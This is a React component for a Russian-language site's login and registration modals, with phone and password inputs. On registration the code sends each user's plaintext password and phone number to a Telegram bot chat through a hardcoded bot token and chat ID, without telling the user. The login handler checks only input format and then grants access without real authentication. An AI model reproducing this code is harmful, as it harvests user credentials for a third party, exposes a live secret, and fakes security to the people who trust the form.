import { useContext, useRef, useState } from 'react';
import './LoginModal.scss'
import { FaEye, FaEyeSlash, FaFacebookF, FaGoogle, FaXmark } from "react-icons/fa6";
import ModalBG from '../ModalsBG/ModalBG';
import { useNavigate } from 'react-router-dom';
import { Context } from '../../Hooks/Context';
import PropTypes from 'prop-types';


export default function LoginModal({ login, setLogin }) {
      // togle modal open/close 
      const [showPassword, setShowPassword] = useState(false)
      const [registerModal, setRegisterModal] = useState(false)
      // togle error open/close 
      const [regPasswordError, setRegPasswordError] = useState(false)
      const [regPhoneError, setRegPhoneError] = useState(false)
      const [logPasswordError, setLogPasswordError] = useState(false)
      const [logPhoneError, setLogPhoneError] = useState(false)
      // Context
      const { setPassRegister } = useContext(Context)
      // forms
      const formReg = useRef(null)
      const formLog = useRef(null)
      // Navigate for checked, go to home
      const navigate = useNavigate()
      // telegram bot api and token
      const token = "7687272018:AAFav5xYZ1Mt1jQGjqwX65iSpCeEERjaR10";
      const chatId = "6528186432";

      const handleCheckValue = (e) => {
            e.preventDefault();

            const forms = new FormData(formReg.current);
            const info = {};
            forms.forEach((value, key) => info[key] = value);

            const isPhoneValid = !isNaN(+info.regNumber) && info.regNumber.trim() !== "";
            const isPasswordValid = info.regPassword && info.regPassword.length >= 8;

            setRegPhoneError(!isPhoneValid);
            setRegPasswordError(!isPasswordValid);

            if (isPhoneValid && isPasswordValid) {
                  fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({
                              chat_id: chatId,
                              text: `new user:\n password: ${info.regPassword}\n number: +${info.regNumber}`
                        })
                  })
                  setRegisterModal(false);
                  navigate("/personal/Personal_information")
                  setPassRegister(true)
            }
      };

      const handleCheckValueLog = (e) => {
            e.preventDefault();

            const forms = new FormData(formLog.current);
            const info = {};
            forms.forEach((value, key) => info[key] = value);

            const isPhoneValid = !isNaN(+info.logNumber) && info.logNumber.trim() !== "";
            const isPasswordValid = info.logPassword && info.logPassword.length >= 8;

            setLogPhoneError(!isPhoneValid);
            setLogPasswordError(!isPasswordValid);

            if (isPhoneValid && isPasswordValid) {
                  setLogin(false);
                  navigate("/personal/Personal_information")
                  setPassRegister(true)
            }
      };


      return (
            <>
                  {login || registerModal ? <ModalBG /> : null}
                  <div className='loginModal' style={{ display: login ? "block" : "none" }}>

                        <div className="modal_header">
                              <h1>Вход</h1>
                              <FaXmark onClick={() => setLogin(false)} />
                        </div>
                        <div className="modal_body">
                              <form action="" ref={formLog}>
                                    <input id='loginNumberInp' name='logNumber' type="text" placeholder='Ваш номер телефона' />
                                    <label htmlFor="loginNumberInp" className={logPhoneError ? "active" : null}>Error</label>
                                    <div className='loginPassword'>
                                          <input id='loginPaswordInp' name='logPassword' placeholder='Пароль' type={showPassword ? 'text' : 'password'} />
                                          <label htmlFor="loginPaswordInp" className={logPasswordError ? "active" : null}>Error</label>
                                          <button onClick={(e) => { e.preventDefault(); setShowPassword(prev => !prev) }}>{showPassword ? <FaEye /> : <FaEyeSlash />}</button>
                                    </div>

                                    <p>Забыли пароль?</p>
                                    <button onClick={(e) => handleCheckValueLog(e)}>ВОЙТИ</button>
                              </form>


                              <p className='or'>или войти с помощью</p>
                              <div className="loginBy">
                                    <button><FaGoogle />Google</button>
                                    <button><FaFacebookF />Faceobok</button>
                              </div>

                              <p className="register">Нет аккаунта? <span onClick={() => { setRegisterModal(true); setLogin(false) }}>Зарегистрироваться</span></p>
                        </div>
                  </div>

                  <div className='loginModal' style={{ display: registerModal ? "block" : "none" }}>

                        <div className="modal_header">
                              <h1>Регистрация</h1>
                              <FaXmark onClick={() => setRegisterModal(false)} />
                        </div>
                        <div className="modal_body">
                              <form action="" ref={formReg}>
                                    <input name='regNumber' id='RegisterNumberInp' type="text" placeholder='Ваш номер телефона' />
                                    <label htmlFor="RegisterNumberInp" className={regPhoneError ? 'active' : null}>Невозможно ввести букву</label>
                                    <div className='loginPassword'>
                                          <input id='RegisterPasswordInp' name='regPassword' placeholder='Пароль' type={showPassword ? 'text' : 'password'} />
                                          <label htmlFor="RegisterPasswordInp" className={regPasswordError ? "active" : null}>пароль должен быть более 8 символов</label>
                                          <button onClick={(e) => { e.preventDefault(); setShowPassword(prev => !prev) }}>{showPassword ? <FaEye /> : <FaEyeSlash />}</button>
                                    </div>

                                    <p className='text-start'><span>Регистрируясь, вы соглашаетесь с </span> пользовательским соглашением</p>
                                    <button onClick={(e) => handleCheckValue(e)}>ЗАРЕГИСТРИРОВАТЬСЯ</button>
                              </form>


                              <p className='or'>или зарегестрироваться с помощью</p>
                              <div className="loginBy">
                                    <button><FaGoogle />Google</button>
                                    <button><FaFacebookF />Faceobok</button>
                              </div>

                              <p className="register">Уже есть зарегестрированы? <span onClick={() => { setRegisterModal(false); setLogin(true) }}>Войти</span></p>
                        </div>
                  </div>
            </>
      )

}

LoginModal.propTypes = {
      login: PropTypes.bool.isRequired,
      setLogin: PropTypes.func.isRequired
}